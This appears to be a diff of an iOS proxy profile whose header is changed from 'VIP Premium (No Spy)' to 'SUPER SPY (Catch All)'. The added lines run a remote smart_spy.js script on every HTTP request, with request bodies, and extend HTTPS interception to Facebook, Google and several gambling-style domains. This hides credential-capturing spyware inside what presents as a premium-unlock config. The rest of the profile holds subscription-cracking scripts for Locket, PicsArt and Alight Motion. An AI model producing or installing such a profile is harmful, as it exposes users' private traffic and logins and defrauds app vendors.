@@ -1,52 +1,45 @@
-#!name = VIP Premium (No Spy)
-#!desc = YouTube, Spotify, Locket Gold & Premium Apps - Clean Version
+#!name = SUPER SPY (Catch All)
+#!desc = Bắt tất cả mọi thứ - Chế độ Vét Cạn
 #!author = TungTinTacKMA
 
 [General]
 bypass-system = true
 skip-proxy = 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12, localhost, *.local, e.crashlytics.com
-tun-excluded-routes = 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.0.0.0/24, 192.0.2.0/24, 192.88.99.0/24, 192.168.0.0/16, 198.51.100.0/24, 203.0.113.0/24, 224.0.0.0/4, 255.255.255.255/32
 dns-server = system
 ipv6 = true
 
 [Rule]
-# === Chặn Quảng Cáo YouTube & Google ===
+# Chặn quảng cáo Youtube (Giữ lại để dùng cho sướng)
 AND,((DOMAIN-SUFFIX,googlevideo.com),(PROTOCOL,UDP)),REJECT
 AND,((DOMAIN,youtubei.googleapis.com),(PROTOCOL,UDP)),REJECT
-
-# Quy tắc cuối: Đi qua Proxy
 FINAL,PROXY
 
 [Header Rewrite]
-# === Locket Gold (Bẻ khóa xác thực) ===
+# Hack Locket & Spotify
 ^https?://api.revenuecat.com/.+/(receipts$|subscribers/?(.*?)*$) header-del x-revenuecat-etag
 ^https?://api.revenuecat.com/.+/(receipts$|subscribers/?(.*?)*$) header-del X-RevenueCat-ETag
-
-# === Spotify Premium (Xóa cache quảng cáo) ===
 http-request ^https:\/\/(spclient\.wg\\.spotify\\.com|.*-spclient\\.spotify\\.com(:443)?)\/user-customization-service\/v1\/customize$ header-del if-none-match
 
 [Url Rewrite]
-# === YouTube Premium (Chặn quảng cáo video) ===
+# Chặn quảng cáo Youtube (Url Rewrite)
 ^https?:\/\/[\w-]+\.googlevideo\.com\/(?!(dclk_video_ads|videoplayback\?)).+&oad _ reject-200
 ^https?:\/\/(www|s)\.youtube\.com\/api\/stats\/ads _ reject-200
-^https?:\/\/(www|s)\.youtube\.com\/(pagead|ptracking) _ reject-200
-^https?:\/\/s\.youtube\.com\/api\/stats\/qoe\?adcontext _ reject-200
 
 [Script]
-# === Locket Gold (Script kích hoạt) ===
+# ==================================================
+# CHẾ ĐỘ VÉT CẠN (QUAN TRỌNG NHẤT)
+# pattern=.* => Bắt tất cả mọi đường link
+# ==================================================
+Super_Spy = type=http-request,pattern=.*,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true,timeout=120
+
+# Các script hack app (giữ lại)
 Locket_Gold = type=http-response,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$),requires-body=true,max-size=-1,timeout=60,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/Locket_DuyVinh09.js
-Locket_Delete_Header = type=http-request,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts|subscribers),script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/deleteHeader.js,timeout=60
-
-# === Alight Motion Pro ===
 AlightMotion = type=http-response,pattern=^https:\/\/api\.alightcreative\.com\/result,requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/AlightMotion.js
-
-# === PicsArt Gold ===
 PicsArt = type=http-request,pattern=^https:\/\/api\.picsart\.com\/gw-v2\/shop\/subscription\/apple\/purchases,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/PicsArt.js,requires-body=true,timeout=60
-
-# === Truecaller Premium ===
-Truecaller = type=http-response,pattern=^https://premium-(.+)\.truecaller\.com/v\d/(subscriptions|products\/apple),requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/TrueCaller.js
 
 [MITM]
 enable = true
-# Danh sách giải mã HTTPS cho các App Premium
-hostname = *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.truecaller.com, *.spotify.com, *.google.com, *.youtube.com
+# ==================================================
+# DANH SÁCH GIẢI MÃ (Bao gồm Game + App Premium)
+# ==================================================
+hostname = *.dsrcgoms.net, *.hit.club, *.wsmt8g.cc, *.genesockezlyfeapy.com, *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.google.com, *.youtube.com, *.facebook.com
